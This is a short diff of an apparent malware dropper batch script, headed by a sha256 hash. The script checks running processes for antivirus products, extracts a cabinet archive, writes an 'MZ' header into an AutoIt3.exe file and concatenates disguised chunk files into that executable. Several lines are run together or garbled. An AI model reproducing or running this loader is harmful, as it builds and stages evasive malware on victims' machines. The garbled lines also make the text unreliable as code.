@@ -3,7 +3,7 @@ sha256:dbdab701feecc382b037b61b4268f1f796c28f3c30d77e18506cb1646bf9cb0b
 
 tasklist | findstr "bd service host ekrn AvastUI SophosHealth AVGUI nsWscSvc" & ifnoterror level1
 md 639237
-start /waitextrac32 /YMarie.xlm*.*
+start /waitextrac32 /Y Marie.xlm*.*
 set /p = "MZ">639237\AutoIt3.exe<nul
 findstr/V"Maryland"Sealed>>639237\AutoIt3.exe
 copy/b/y639237\AutoIt3.exe+Assumption+Guess+Fl+Charms+Cbs+Competitors+Vids+Televisions+Sea+Involved+Coming+Nextel639237\AutoIt3.exe\
